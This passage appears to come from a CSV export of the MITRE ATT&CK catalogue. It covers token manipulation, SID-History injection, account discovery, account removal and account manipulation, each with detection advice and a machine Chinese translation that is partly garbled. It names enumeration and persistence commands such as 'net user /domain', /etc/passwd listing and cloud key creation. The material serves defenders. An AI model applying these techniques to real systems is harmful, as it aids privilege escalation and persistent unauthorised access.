Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",https://attack.mitre.org/techniques/T1134/004,18 February 2020,03 May 2022,1.0,"Defense Evasion, Privilege Escalation","Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)

Monitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.",Windows,"Process: OS API Execution, Process: Process Creation, Process: Process Metadata",True,T1134,"Heuristic Detection, Host Forensic Analysis","Wayne Silva, F-Secure Countercept","Administrator, User",,,,,,"(Citation: CobaltStrike Daddy May 2017),(Citation: ESET PipeMon May 2020),(Citation: Malwarebytes Konni Aug 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),",篡改访问令牌：父 PID 欺骗,攻击者可能会欺骗新进程的父进程标识符 (PPID) 以逃避进程监控防御或提升特权。除非明确指定，否则新进程通常直接从其父进程或调用进程中生成。显式分配新进程的 PPID 的一种方法是通过 <code>CreateProcess</code> API 调用，它支持定义要使用的 PPID 的参数。（引用：DidierStevens SelectMyParent Nov 2009）此功能由 Windows 使用诸如用户帐户控制 (UAC) 之类的功能可在 SYSTEM（通常通过 <code>svchost.exe</code> 或 <code>consent.exe</code>）生成请求的提升进程后正确设置 PPID，而不是当前用户上下文。（引用：Microsoft UAC Nov 2018）攻击者可能会滥用这些机制来逃避防御，例如那些阻止直接从 Office 文档生成的进程，以及针对异常/潜在恶意父子进程关系的分析，例如欺骗[PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) 的 PPID 为 <code>explorer。 exe</code> 而不是作为 [Spearphishing 附件](http s://attack.mitre.org/techniques/T1566/001）。（引用：CounterCept PPID Spoofing Dec 2018）这种欺骗可以通过 [Visual Basic] 执行（https://attack.mitre.org/techniques/T1059 /005）在恶意 Office 文档或任何可以执行 [Native API] 的代码中（https://attack.mitre.org/techniques/T1106）。（引用：CTD PPID Spoofing Macro Mar 2019）（引用：CounterCept PPID Spoofing 2018 年 12 月）显式分配 PPID 还可以启用提升的权限，给定对父进程的适当访问权限。例如，特权用户上下文中的攻击者（即管理员）可能会产生一个新进程并将父进程分配为以 SYSTEM 运行的进程（例如 <code>lsass.exe</code>），从而导致新进程通过继承的访问令牌提升。（引用：XPNSec PPID 2017 年 11 月）
T1134.005,Access Token Manipulation: SID-History Injection,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",https://attack.mitre.org/techniques/T1134/005,18 February 2020,09 February 2021,1.0,"Defense Evasion, Privilege Escalation","Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)

Monitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)",Windows,"Active Directory: Active Directory Object Modification, Process: OS API Execution, User Account: User Account Metadata",True,T1134,,"Alain Homewood, Insomnia Security; Vincent Le Toux","Administrator, SYSTEM",,,,,,"(Citation: Adsecurity Mimikatz Guide),(Citation: Github PowerShell Empire),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Microsoft SID Filtering Quarantining Jan 2009),(Citation: Microsoft Trust Considerations Nov 2014),(Citation: Microsoft Netdom Trust Sept 2012)",篡改访问令牌：SID-History 注入,攻击者可能会使用 SID 历史注入来提升权限并绕过访问控制。 Windows 安全标识符 (SID) 是标识用户或组帐户的唯一值。 Windows 安全在安全描述符和访问令牌中都使用 SID。 （引用：Microsoft SID）帐户可以在 SID-History Active Directory 属性（引用：Microsoft SID-History Attribute）中保存额外的 SID，从而允许域之间可互操作的帐户迁移（例如，SID-History 中的所有值都包含在访问令牌）。使用域管理员（或等效）权限，可以将获取的或众所周知的 SID 值（引用：Microsoft Well Known SIDs Jun 2017）插入到 SID 历史记录中，以模拟任意用户/组，例如企业管理员。这种操纵可能会导致通过横向移动技术（例如 [Remote Services](https://attack.mitre.org/techniques/T1021)、[SMB/Windows Admin Shares）提升对本地资源的访问权限和/或对其他无法访问的域的访问权限](https://attack.mitre.org/techniques/T1021/002) 或 [Windows 远程管理](https://attack.mitre.org/techniques/T1021/006)。
T1134.001,Access Token Manipulation: Token Impersonation/Theft,"Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.

An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.",https://attack.mitre.org/techniques/T1134/001,18 February 2020,26 March 2020,1.0,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

Analysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",,,,,,,,"(Citation: GitHub Pupy),(Citation: Unit 42 Siloscape Jun 2021),(Citation: McAfee Shamoon December 2018),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: cobaltstrike manual),(Citation: FinFisher Citation),(Citation: CheckPoint Naikon May 2020),(Citation: ESET Okrum July 2019),(Citation: McAfee Sodinokibi October 2019),(Citation: Tarrask scheduled task),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Bitdefender FIN8 July 2021),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye Op RussianDoll),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token),(Citation: Microsoft runas)",篡改访问令牌：令牌模拟/盗窃,攻击者可能会复制然后冒充另一个用户的令牌以提升权限并绕过访问控制。攻击者可以创建一个新的访问令牌，使用 <code>DuplicateToken(Ex)</code> 复制现有令牌。然后可以将令牌与 <code>ImpersonateLoggedOnUser</code> 一起使用，以允许调用线程模拟登录用户的安全上下文，或与 <code>SetThreadToken</code> 一起使用以将模拟的令牌分配给线程。当攻击者想要将新令牌分配给特定的现有流程时，他们可能会这样做。例如，当目标用户在系统上具有非网络登录会话时，这可能很有用。
T1531,Account Access Removal,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)

In Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. In Linux, the <code>passwd</code> utility may be used to change passwords. Accounts could also be disabled by Group Policy. 

Adversaries who use ransomware may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. ",https://attack.mitre.org/techniques/T1531,09 October 2019,19 April 2022,1.1,Impact,"Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:

* Event ID 4723 - An attempt was made to change an account's password
* Event ID 4724 - An attempt was made to reset an account's password
* Event ID 4726 - A user account was deleted
* Event ID 4740 - A user account was locked out

Alerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.","Linux, Office 365, SaaS, Windows, macOS","Active Directory: Active Directory Object Modification, User Account: User Account Deletion, User Account: User Account Modification",False,,,,,,,,Availability,,"(Citation: IBM MegaCortex),(Citation: CarbonBlack LockerGoga 2019),(Citation: Check Point Meteor Aug 2021),(Citation: Unit42 LockerGoga 2019),(Citation: MSTIC DEV-0537 Mar 2022),",删除帐户访问权限,攻击者可能会通过禁止访问合法用户使用的帐户来中断系统和网络资源的可用性。帐户可能会被删除、锁定或操纵（例如：更改的凭据）以删除对帐户的访问权限。攻击者也可能随后注销和/或执行 [系统关闭/重启](https://attack.mitre.org/techniques/T1529) 以设置恶意更改。（引用：CarbonBlack LockerGoga 2019）（引用：Unit42 LockerGoga 2019) 在 Windows 中，[Net](https://attack.mitre.org/software/S0039) 实用程序，<code>Set-LocalUser</code> 和 <code>Set-ADAccountPassword</code> [PowerShell] (https://attack.mitre.org/techniques/T1059/001) 攻击者可能会使用 cmdlet 来修改用户帐户。在 Linux 中，<code>passwd</code> 实用程序可用于更改密码。帐户也可以通过组策略禁用。使用勒索软件的攻击者可能首先执行此和其他影响行为，例如 [数据破坏](https://attack.mitre.org/techniques/T1485) 和 [污损](https://attack.mitre.org/techniques /T1491)，在完成 [为影响而加密的数据](https://attack.mitre.org/techniques/T1486) 目标之前。
T1087,Account Discovery,Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.,https://attack.mitre.org/techniques/T1087,31 May 2017,13 October 2021,2.3,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Monitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Command: Command Execution, File: File Access, Process: Process Creation, User Account: User Account Metadata",False,,,"Daniel Stepanic, Elastic; Microsoft Threat Intelligence Center (MSTIC); Travis Smith, Tripwire",User,,,CAPEC-575,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: Volexity SolarWinds),(Citation: FOX-IT May 2016 Mofang),(Citation: UCF STIG Elevation Account Enumeration)",账户发现,攻击者可能会尝试获取系统或环境中的帐户列表。此信息可以帮助攻击者确定存在哪些帐户以帮助进行后续行为。
T1087.004,Account Discovery: Cloud Account,"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.

With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) 

The AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)",https://attack.mitre.org/techniques/T1087/004,21 February 2020,16 March 2021,1.2,Discovery,"Monitor processes, command-line arguments, and logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.

System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.","Azure AD, Google Workspace, IaaS, Office 365, SaaS","Command: Command Execution, User Account: User Account Metadata",True,T1087,,Praetorian,User,,,,,,"(Citation: Roadtools),(Citation: MSTIC Nobelium Oct 2021),(Citation: AADInternals Documentation),",账户发现：云账户,攻击者可能会尝试获取云帐户列表。云帐户是由组织创建和配置的帐户，供用户、远程支持、服务使用，或用于管理云服务提供商或 SaaS 应用程序中的资源。通过经过身份验证的访问，有多种工具可用于查找帐户。 <code>Get-MsolRoleMember</code> PowerShell cmdlet 可用于获取 Office 365 中给定角色或权限组的帐户名称。（引用：Microsoft msolrolemember）（引用：GitHub Raindance）Azure CLI (AZ CLI) 也提供了一个接口来获取具有对域的经过身份验证的访问权限的用户帐户。命令 <code>az ad user list</code> 将列出域中的所有用户。（引用：Microsoft AZ CLI）（引用：Black Hills Red Teaming MS AD Azure，2018）AWS 命令 <code>aws iam list -users</code> 可用于获取当前账户中的用户列表，而 <code>aws iam list-roles</code> 可获取具有指定路径前缀的 IAM 角色。（引用：AWS List Roles） （引用：AWS List Users）在 GCP 中，<code>gcloud iam service-accounts list</code> 和 <code>gcloud projects get-iam-policy</code> 可用于获取服务帐户和用户的列表在一个项目中。（引用：Google Cloud - IAM 服务帐户列表 API）
T1087.002,Account Discovery: Domain Account,"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.

Commands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.",https://attack.mitre.org/techniques/T1087/002,21 February 2020,25 August 2022,1.1,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
","Linux, Windows, macOS","Command: Command Execution, Group: Group Enumeration, Group: Group Enumeration, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation",True,T1087,,"ExtraHop; Miriam Wiesner, @miriamxyra, Microsoft Security",,,,CAPEC-575,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Cyberreason Anchor December 2019),(Citation: CISA SoreFang July 2016),(Citation: SecureWorks August 2019),(Citation: FireEye FIN6 Apr 2019),(Citation: Cybereason Valak May 2020),(Citation: Cycraft Chimera April 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: McAfee Bankshot),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Github PowerShell Empire),(Citation: Secureworks IRON RITUAL Profile),(Citation: FoxIT Wocao December 2019),(Citation: DFIR Ryuk's Return October 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Cybereason Bumblebee August 2022),(Citation: CME Github September 2018),(Citation: NCC Group Team9 June 2020),(Citation: IBM IcedID November 2017),(Citation: TechNet Dsquery),(Citation: Symantec Bumblebee June 2022),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Symantec Buckeye),(Citation: Palo Alto OilRig May 2016),(Citation: AlienVault Sykipot 2011),(Citation: ESET ComRAT May 2020),(Citation: ESET Lazarus Jun 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: Kaspersky Poseidon Group),(Citation: ESET Telebots Dec 2016),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: GitHub PoshC2),(Citation: NCC Group Chimera January 2021),(Citation: FireEye FIN6 April 2016),(Citation: US-CERT TA18-074A),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: FireEye APT34 Dec 2017),(Citation: CrowdStrike BloodHound April 2018),(Citation: Microsoft Net),(Citation: UCF STIG Elevation Account Enumeration)",帐户发现：域帐户,攻击者可能会尝试获取域帐户列表。此信息可以帮助攻击者确定存在哪些域帐户以帮助进行后续行为。 [Net](https://attack.mitre.org/software/S0039)实用程序的<code>net user /domain</code>和<code>net group /domain</code>等命令，<code macOS 上的 >dscacheutil -q group</code> 和 Linux 上的 <code>ldapsearch</code> 可以列出域用户和组。
T1087.003,Account Discovery: Email Account,"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)

In on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)

In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)",https://attack.mitre.org/techniques/T1087/003,21 February 2020,31 March 2021,1.1,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Google Workspace, Office 365, Windows","Command: Command Execution, Process: Process Creation, User Account: User Account Metadata",True,T1087,,,User,,,,,,"(Citation: ESET Grandoreiro April 2020),(Citation: SensePost Ruler GitHub),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Trend Micro TA505 June 2019),(Citation: Black Hills Attacking Exchange MailSniper, 2016),(Citation: ESET Telebots July 2017),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: CIS Emotet Dec 2018),(Citation: BiZone Lizar May 2021),(Citation: Symantec Dragonfly),(Citation: IBM IcedID November 2017),(Citation: Trend Micro Trickbot Nov 2018),",帐户发现：电子邮件帐户,攻击者可能会尝试获取电子邮件地址和帐户的列表。攻击者可能会尝试转储 Exchange 地址列表，例如全局地址列表 (GAL)。（引用：Microsoft Exchange 地址列表）在本地 Exchange 和 Exchange Online 中，可以使用 <code>Get-GlobalAddressList</code> PowerShell cmdlet使用经过身份验证的会话从域中获取电子邮件地址和帐户。（引用：Microsoft getglobaladdresslist）（引用：Black Hills Attacking Exchange MailSniper，2016）在 Google Workspace 中，GAL 通过 Google Workspace Sync for Microsoft 与 Microsoft Outlook 用户共享Outlook (GWSMO) 服务。此外，Google Workspace 目录允许用户获取组织内其他用户的列表。（引用：Google Workspace 全球访问列表）
T1087.001,Account Discovery: Local Account,"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.

Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.",https://attack.mitre.org/techniques/T1087/001,21 February 2020,25 August 2022,1.3,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Monitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)","Linux, Windows, macOS","Command: Command Execution, File: File Access, Group: Group Enumeration, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation",True,T1087,,"Daniel Stepanic, Elastic; Miriam Wiesner, @miriamxyra, Microsoft Security",,,,,,,"(Citation: Morphisec ShellTea June 2019),(Citation: CISA SoreFang July 2016),(Citation: Cybereason Valak May 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Mandiant APT1),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: McAfee Bankshot),(Citation: Savill 1999),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Github PowerShell Empire),(Citation: ClearSky Siamesekitten August 2021),(Citation: S2 Grupo TrickBot June 2017),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: NCC Group Team9 June 2020),(Citation: GitHub Pupy),(Citation: Kaspersky Turla Aug 2014),(Citation: Symantec W32.Duqu),(Citation: RATANKBA),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: ESET Crutch December 2020),(Citation: Lotus Blossom Jun 2015),(Citation: Malwarebytes Pony April 2016),(Citation: Symantec Buckeye),(Citation: Palo Alto OilRig May 2016),(Citation: ESET InvisiMole June 2018),(Citation: ESET ComRAT May 2020),(Citation: GitHub PowerSploit May 2012),(Citation: FireEye Periscope March 2018),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Palo Alto Comnie),(Citation: Kaspersky Poseidon Group),(Citation: Unit 42 Kazuar May 2017),(Citation: FireEye SMOKEDHAM June 2021),(Citation: GitHub PoshC2),(Citation: PowerSploit Documentation),(Citation: NCC Group Chimera January 2021),(Citation: Accenture HyperStack October 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: FireEye admin@338),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Symantec Orangeworm April 2018),(Citation: ANSSI Sandworm January 2021),(Citation: F-Secure The Dukes),(Citation: Cylance Dust Storm),(Citation: CrowdStrike BloodHound April 2018),(Citation: UCF STIG Elevation Account Enumeration)",帐户发现：本地帐户,攻击者可能会尝试获取本地系统帐户的列表。此信息可以帮助攻击者确定系统上存在哪些本地帐户，以帮助进行后续行为。 [Net](https://attack.mitre.org/software/S0039)实用程序的<code>net user</code>和<code>net localgroup</code>等命令和<code>id</ macOS 和 Linux 上的 code> 和 <code>groups</code> 可以列出本地用户和组。在 Linux 上，也可以通过使用 <code>/etc/passwd</code> 文件来枚举本地用户。在 macOS 上， <code>dscl 。 list /Users</code> 命令可用于枚举本地帐户。
T1098,Account Manipulation,"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. 

In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",https://attack.mitre.org/techniques/T1098,31 May 2017,18 October 2022,2.4,Persistence,"Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)

Monitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.

Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Modification, Group: Group Modification, Process: Process Creation, User Account: User Account Modification",False,,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Praetorian; Tim MalcomVetter; Wojciech Lesicki",,,,,,,"(Citation: Adsecurity Mimikatz Guide),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: Symantec Calisto July 2018),(Citation: Metcalf 2015),(Citation: aptsim),(Citation: Novetta Blockbuster),(Citation: Novetta Blockbuster Destructive Malware),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Dragos Crashoverride 2018),",篡改账户,攻击者可能会操纵帐户以维持对受害者系统的访问。帐户操纵可能包括保留攻击者对受损帐户的访问权限的任何操作，例如修改凭据或权限组。这些操作还可能包括旨在破坏安全策略的帐户活动，例如执行迭代密码更新以绕过密码持续时间策略并保留受损凭据的生命周期。为了创建或操纵帐户，攻击者必须已经对系统或域拥有足够的权限。但是，帐户操作也可能导致权限升级，其中修改授予对其他角色、权限或更高权限的 [有效帐户] 的访问权限 (https://attack.mitre.org/techniques/T1078)。
T1098.001,Account Manipulation: Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.

For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)

In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)

Adversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)",https://attack.mitre.org/techniques/T1098/001,19 January 2020,24 October 2022,2.4,Persistence,"Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.

